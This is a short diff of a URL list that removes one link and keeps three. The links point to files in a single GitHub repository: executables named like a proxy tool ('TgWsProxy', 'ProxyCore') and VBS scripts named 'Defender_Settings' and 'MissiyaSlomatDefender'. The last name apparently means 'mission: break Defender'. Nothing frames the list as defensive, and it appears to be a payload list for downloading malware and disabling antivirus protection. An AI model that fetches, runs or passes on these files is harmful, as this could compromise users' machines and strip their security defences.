@@ -1,4 +1,3 @@
-https://github.com/vehrbyzzzz/rp/raw/refs/heads/main/TgWsProxy(2).exe
 https://github.com/vehrbyzzzz/rp/raw/refs/heads/main/ProxyCore.exe
 https://raw.githubusercontent.com/vehrbyzzzz/rp/refs/heads/main/Defender_Settings.vbs
 https://raw.githubusercontent.com/vehrbyzzzz/rp/refs/heads/main/MissiyaSlomatDefender.vbs
